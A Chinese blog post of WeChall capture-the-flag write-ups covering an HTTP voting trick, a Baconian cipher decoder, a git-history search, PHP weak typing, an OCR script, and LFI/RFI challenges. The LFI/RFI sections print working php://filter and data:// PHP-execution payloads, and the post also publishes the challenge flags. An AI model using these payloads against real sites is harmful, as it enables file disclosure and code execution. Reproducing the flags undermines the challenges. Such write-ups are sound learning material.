---
layout: post
title: "Wechall WriteUp"
date: 2017-11-23 11:47:56
categories: jekyll update
---

	初入ctf，写下记录以便查看。这里是wechall的一些题解。

### 目录

* [Training: Tracks (HTTP)](#1)
* [Training: Baconian (Stegano, Encoding, Crypto, Training)](#2)
* [Repeating History (Research)](#3)
* [PHP 0818 (Exploit, PHP)](#4)
* [Warchall: Live LFI (Linux, Exploit, Warchall)](#5)
* [Warchall: Live RFI (Linux, Exploit, Warchall)](#6)
* [Can you read me (Coding, Image)](#7)
---------------

### <a name="1"></a>1. Training: Tracks (HTTP)

 1、进入投票页面
<div align="center">
	<img src="/images/posts/writeup1/1.png" height="300" width="500">  
</div>

点击 + 号，
<div align="center">
	<img src="/images/posts/writeup1/2.png" height="300" width="500">  
</div>

再次点击进行投票。
<div align="center">
	<img src="/images/posts/writeup1/3.png" height="300" width="500">  
</div>

此时完成第一次投票。进行第二次时会报错。
<div align="center">
	<img src="/images/posts/writeup1/4.png" height="300" width="500">  
</div>

这时，我们将VOTE cookie删掉，如果不删会导致后续不成功。
<div align="center">
	<img src="/images/posts/writeup1/5.png" height="300" width="500">  
</div>

 	打开burpsuite，抓包改包。修改If-None-Match的值，请求更新数据，因为服务器一开始会分配Etag，然后下次检测时会对比两者的值，如果一样就不更新数据，导致无法投票。

然后投票成功，通过题目。
<div align="center">
	<img src="/images/posts/writeup1/6.png" height="300" width="500">  
</div>

----------


### <a name="2"></a>2、Training: Baconian (Stegano, Encoding, Crypto, Training)


这题是解密培根密码，培根密码有两种密码表，并使用’A’、’B’代替0，1进行编码。
第一种密码表：

<div align="center">
	<img src="/images/posts/writeup1/7.png" height="300" width="500">  
</div>

第二种密码表：

<div align="center">
	<img src="/images/posts/writeup1/8.png" height="300" width="500">  
</div>

	**假如我要加密‘hello’，按照第一种方法加密的结果为：aabbb,aabaa,ababa,ababa,abbab；第二种为：aabbb,aabaa,ababb,ababb,abbba。
假如要解密‘WOrld…’，把整个字符串的大小写代表着‘A’、‘B’编码，所以这里有两个编码可能性，一是大写代表‘A’，小写代表‘B’，第二种相反。同时这里又有两种密码表，所以这里一共有2*2=4种可能性。
大写代表‘A’，小写代表‘B’，用第一种密码表可得：‘h’，第二种为：‘h’，这里刚好一样。
大写代表‘B’，小写代表‘A’，用第一种密码表没有结果，第二种为：‘y’。**
	
所以将题目中给出的字符进行清洗，去除非字母字符包括数字。然后写个python脚本 。

```python
import re
Str = ‘………..’
arr = re.findall('.{5}', str)
alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
first_cipher = ["aaaaa","aaaab","aaaba","aaabb","aabaa","aabab","aabba","aabbb","abaaa","abaab","ababa","ababb","abbaa","abbab","abbba","abbbb","baaaa","baaab","baaba","baabb","babaa","babab","babba","babbb","bbaaa","bbaab"]
second_cipher = ["aaaaa","aaaab","aaaba","aaabb","aabaa","aabab","aabba","aabbb","abaaa","abaaa","abaab","ababa","ababb","abbaa","abbab","abbba","abbbb","baaaa","baaab","baaba","baabb","baabb","babaa","babab","babba","babbb"]

keyword1 = ""
keyword2 = ""
keyword3 = ""
keyword4 = ""
for one in arr:
    toab1 = ""
    toab2 = ""
    for i in one:
        if i.isupper():
            toab1 += 'b'
            toab2 += 'a'
        else:
            toab1 += 'a'
            toab2 += 'b'

    for local,ab in enumerate(first_cipher):
        if ab == toab1:
            keyword1 += alphabet[local]
        if ab == toab2:
            keyword3 += alphabet[local]

    for local,ab in enumerate(second_cipher):
        if ab == toab1:
            keyword2 += alphabet[local]
        if ab == toab2:
            keyword4 += alphabet[local]

print(keyword1)
print(keyword2)
print(keyword3)
print(keyword4)
```

在输出中匹配‘is’，（别问为什么可以如此操作，，，直觉）并替换‘x’为空格。即可得出flag：iblpsclsennp

<div align="center">
	<img src="/images/posts/writeup1/9.png" height="300" width="500">  
</div>

<div align="center">
	<img src="/images/posts/writeup1/10.png" height="300" width="500">  
</div>

----------


### <a name="3"></a>3、Repeating History (Research)


打开题中给出的github项目地址，找到该题目的文件夹。发现有两个文件夹，然后，，找。。。

<div align="center">
	<img src="/images/posts/writeup1/11.png" height="300" width="500">  
</div>

先打开history
<div align="center">
	<img src="/images/posts/writeup1/12.png" height="300" width="500">  
</div>

然后在install.php中可以找到$solution = '2bda2998d9b0ee197da142a0447f6725'; 进行md5解码可得“wrong”，发现是错误的。再查看提交记录。
<div align="center">
	<img src="/images/posts/writeup1/13.png" height="300" width="500">  
</div>

查看图示中的历史

<div align="center">
	<img src="/images/posts/writeup1/14.png" height="300" width="500">  
</div>

可以找到真实的solution。
<div align="center">
	<img src="/images/posts/writeup1/15.png" height="300" width="500">  
</div>

翻遍这个文件夹也没有找到其他信息，返回打开repeating文件夹，可以找到第一部分。
	

```
Oh right... the solution to part one is '<?php /*InDaxIn*/ ?>' without the PHP comments and singlequotes.
```

所以，flag为：InDaxInNothingHereMoveAlong


----------

## <a name="4"></a>4、PHP 0818 (Exploit, PHP)


审计，可以看到要提交的魔数，但在前面的for循环中又不允许出现“1-9”的数字。同时，return时用的是“==”而不是“===”，所以可能是弱类型利用。将魔数进行16进制转换，可以得到：deadc0de，0并不在其中。所以提交0xdeadc0de，解决问题。
<div align="center">
	<img src="/images/posts/writeup1/16.png" height="300" width="500">  
</div>

----------

### <a name="5"></a>5、Warchall: Live LFI (Linux, Exploit, Warchall)


文件包含，打开链接，发现只有设置网站语言的地方有参数传递，所以尝试构造：http://lfi.warchall.net/index.php?lang=solution.php。
<div align="center">
	<img src="/images/posts/writeup1/17.png" height="300" width="500">  
</div>

一看有戏，尝试读取文件源码。这里介绍读源码的两种：

	?file=data:text/plain,<?php system("cat solution.php")?>
	?file=php://filter/read=convert.base64-encode/resource=index.php

构造：http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php。

Base64解密后可得：SteppinStones42Pie


----------


### <a name="6"></a>6、Warchall: Live RFI (Linux, Exploit, Warchall)


与上题类似，读取文件，构造：http://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php。

<div align="center">
	<img src="/images/posts/writeup1/18.png" height="300" width="500">  
</div>

Base64解码：

```html
<html>
<body>
<pre>NOTHING HERE????</pre>
</body>
</html>
<?php return 'Low_H4NGING_Fruit'; ?>
```

这里也可以用：`http://rfi.warchall.net/index.php?lang=data:text/plain,<?php system("cat solution.php")?>。`

<div align="center">
	<img src="/images/posts/writeup1/19.png" height="300" width="500">  
</div>

点击查看源代码：
<div align="center">
	<img src="/images/posts/writeup1/20.png" height="300" width="500">  
</div>

手工，提交。


----------


### <a name="7"></a>7、Can you read me (Coding, Image)


	Description
		A friend and me have a bet running, that you won't beat his OCR program in scanning text out of images.
		His average scan time is 2.5 seconds, can you beat that?


要求在2.5s内识别并提交，首先安装tesseract：

```
apt install tesseract-ocr。
```

编写python脚本：

```python
import requests
import os

cookie = {
    'WC':'9953502-36792-3nWdWNVeHmWfnYj',
}
html = requests.get('http://www.wechall.net/challenge/can_you_readme/gimme.php', cookies=cookie)
png = open('png.jpg', 'wb').write(html.content) #写图片要使用二进制，并且使用html.content，而不是html.text

log = os.system('tesseract png.jpg png -l eng')
keyword = open('dec.txt', 'r').readline().rstrip('\n')
print('keyword is ' + keyword)
url = 'http://www.wechall.net/challenge/can_you_readme/index.php?solution={0}&cmd=Answer'.format(keyword)
page = requests.get(url, cookies=cookie)
print(page.text)
```
搞定。